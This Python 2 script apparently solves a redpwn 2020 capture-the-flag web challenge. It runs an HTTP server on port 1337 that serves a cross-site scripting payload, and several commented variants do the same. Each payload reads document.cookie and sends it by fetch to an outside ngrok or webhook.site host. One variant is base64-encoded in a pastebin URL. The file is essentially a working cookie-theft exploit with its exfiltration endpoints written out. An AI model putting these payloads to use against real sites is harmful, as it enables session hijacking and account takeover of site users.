import time
import BaseHTTPServer

class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
    def do_GET(self):
        """Respond to a GET request."""
        if "x" in self.path:
          self.send_response(404)
        else:
          self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write('<img src=x onerror=fetch("https://923a981d8ceb.ngrok.io?cookie=".concat(document.cookie),{credentials:"include"}) >')  
        # s.wfile.write('<script>fetch("https://static-static-hosting.2020.redpwnc.tf").then(function(response) { return fetch("https://923a981d8ceb.ngrok.io?cookie=".concat(response.json())), {credentials:"include"}});</script>'.encode("utf-8"))
        #https://static-pastebin.2020.redpwnc.tf/paste/#PjxpbWcgc3JjPXhzcyBvbmVycm9yPWZldGNoKCJodHRwczovLzkyM2E5ODFkOGNlYi5uZ3Jvay5pbz9jb29raWU9Ii5jb25jYXQoZG9jdW1lbnQuY29va2llKSk+
        # "https://webhook.site/7e99c21c-2c26-43a2-9901-c7f570961bb5?cookie=".concat(document.cookie));alert("XSS Executed");
        # '<script>fetch("https://923a981d8ceb.ngrok.io?cookie=".concat(document.cookie));</script>'
        # '<img src=x onerror=fetch("https://923a981d8ceb.ngrok.io?cookie=".concat(document.cookie)) >'

if __name__ == '__main__':
    server_class = BaseHTTPServer.HTTPServer
    httpd = server_class(("0.0.0.0", 1337), MyHandler)
    print(time.asctime(), "Server Starts - %s:%s" % ("0.0.0.0", 1337))
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    httpd.server_close()
    print(time.asctime(), "Server Stops - %s:%s" % ("0.0.0.0", 1337))
